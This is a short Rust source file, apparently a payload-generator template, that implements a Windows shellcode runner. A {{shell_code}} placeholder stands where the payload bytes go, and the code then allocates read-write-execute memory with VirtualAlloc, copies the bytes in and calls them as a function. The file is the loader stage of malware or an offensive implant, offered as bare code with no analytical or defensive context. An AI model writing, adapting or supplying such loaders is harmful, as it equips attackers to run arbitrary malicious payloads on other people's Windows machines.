use std::ptr::copy_nonoverlapping;
use windows::Win32::System::Memory::{
    VirtualAlloc, VirtualFree,
    MEM_COMMIT, MEM_RESERVE, MEM_RELEASE,
    PAGE_EXECUTE_READWRITE,
};

fn main() {
    {{shell_code}}

    unsafe {
        let exec = VirtualAlloc(
            None,                     
            buf.len(),                
            MEM_COMMIT | MEM_RESERVE, 
            PAGE_EXECUTE_READWRITE,   
        );
        assert!(!exec.is_null(), "VirtualAlloc failed");

        copy_nonoverlapping(buf.as_ptr(), exec as *mut u8, buf.len());

        let run: extern "system" fn() = std::mem::transmute(exec);
        run();

        VirtualFree(exec, 0, MEM_RELEASE);
    }
}
